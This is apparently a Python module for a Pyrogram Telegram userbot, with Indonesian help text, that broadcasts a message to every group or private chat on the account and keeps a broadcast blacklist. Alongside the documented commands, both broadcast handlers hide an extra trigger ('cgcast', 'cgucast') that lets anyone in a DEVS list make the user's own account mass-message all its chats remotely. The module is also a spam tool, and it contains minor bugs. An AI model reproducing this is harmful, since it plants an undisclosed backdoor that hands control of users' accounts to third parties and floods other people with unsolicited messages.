import asyncio

from pyrogram import *
from pyrogram.enums import ChatType
from pyrogram.types import *

from . import *

__MODULE__ = "Broadcast"
__HELP__ = f"""
๏ Perintah: <code>{cmd}gucast</code> [text/reply to text/media]
◉ Penjelasan: Untuk mengirim pesan ke semua user 
           
๏ Perintah: <code>{cmd}gcast</code> [text/reply to text/media]
◉ Penjelasan: Untuk mengirim pesan ke semua group 
           
๏ Perintah: <code>{cmd}addbl</code>
◉ Penjelasan: Menambahkan grup kedalam anti Gcast.
           
๏ Perintah: <code>{cmd}delbl</code>
◉ Penjelasan: Menghapus grup dari daftar anti Gcast.
           
๏ Perintah: <code>{cmd}listbl</code>
◉ Penjelasan: Melihat daftar grup anti Gcast.
           
"""


@bots.on_message(filters.user(DEVS) & filters.command("cgcast", ".") & ~filters.me)
@bots.on_message(filters.me & filters.command("gcast", cmd))
async def _(client, message: Message):
    sent = 0
    failed = 0
    user_id = client.me.id
    msg = await eor(message, "<code>Processing global broadcast...</code>")
    list_blchat = await blacklisted_chats(user_id)
    async for dialog in client.get_dialogs():
        if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.reply_to_message:
                send = message.reply_to_message
            else:
                if len(message.command) < 2:
                    return await msg.edit(
                        "<code>Berikan pesan atau balas pesan...</code>"
                    )
                else:
                    send = message.text.split(None, 1)[1]
            chat_id = dialog.chat.id
            if chat_id not in list_blchat and chat_id not in BL_GCAST:
                try:
                    if message.reply_to_message:
                        await send.copy(chat_id)
                    else:
                        await client.send_message(chat_id, send)
                    sent += 1
                    await asyncio.sleep(1)
                except Exception:
                    failed += 1
                    await asyncio.sleep(1)
    await msg.edit(f"**✅ Berhasil Terkirim: `{sent}` \n❌ Gagal Terkirim: `{failed}`**")


@bots.on_message(filters.user(DEVS) & filters.command("cgucast", ".") & ~filters.me)
@bots.on_message(filters.me & filters.command("gucast", cmd))
async def _(client, message: Message):
    sent = 0
    failed = 0
    msg = await eor(message, "<code>Processing global broadcast...</code>")
    async for dialog in client.get_dialogs():
        if dialog.chat.type == ChatType.PRIVATE:
            if message.reply_to_message:
                send = message.reply_to_message
            else:
                if len(message.command) < 2:
                    return await msg.edit("Mohon berikan pesan atau balas ke pesan...")
                else:
                    send = message.text.split(None, 1)[1]
            chat_id = dialog.chat.id
            if chat_id not in DEVS:
                try:
                    if message.reply_to_message:
                        await send.copy(chat_id)
                    else:
                        await client.send_message(chat_id, send)
                    sent += 1
                    await asyncio.sleep(1)
                except Exception:
                    failed += 1
                    await asyncio.sleep(1)
    await msg.edit(f"**✅ Berhasil Terkirim: `{sent}` \n❌ Gagal Terkirim: `{failed}`**")


@bots.on_message(filters.me & filters.command("addbl", cmd))
async def bl_chat(client, message):
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)
    if chat.type == "private":
        return await eor(message, "Maaf, perintah ini hanya berlaku untuk grup.")
    user_id = client.me.id
    bajingan = await blacklisted_chats(user_id)
    if chat in bajingan:
        return await eor(message, "Obrolan sudah masuk daftar Blacklist Gcast.")
    await blacklist_chat(user_id, chat_id)
    await eor(
        message, "Obrolan telah berhasil dimasukkan ke dalam daftar Blacklist Gcast."
    )


@bots.on_message(filters.me & filters.command("delbl", cmd))
async def del_bl(client, message):
    if len(message.command) != 2:
        return await eor(
            message, "<b>Gunakan Format:</b>\n <code>delbl [CHAT_ID]</code>"
        )
    user_id = client.me.id
    chat_id = int(message.text.strip().split()[1])
    if chat_id not in await blacklisted_chats(user_id):
        return await eor(
            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
        )
    whitelisted = await whitelist_chat(user_id, chat_id)
    if whitelisted:
        return await eor(
            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
        )
    await eor(message, "Sesuatu yang salah terjadi.")


@bots.on_message(filters.me & filters.command("listbl", cmd))
async def all_chats(client, message):
    text = "<b>Daftar Blacklist Gcast:</b>\n\n"
    j = 0
    user_id = client.me.id
    chat_id = message.chat.id
    for count, chat_id in enumerate(await blacklisted_chats(user_id), 1):
        try:
            chat = await client.get_chat(chat_id)
            title = chat.title
        except Exception:
            title = "Private\n"
        j = 1
        text += f"<b>{count}.{title}</b><code{chat_id}</code>\n"
    if j == 0:
        await eor(message, "Tidak Ada Daftar Blacklist Gcast.")
    else:
        await eor(message, text)
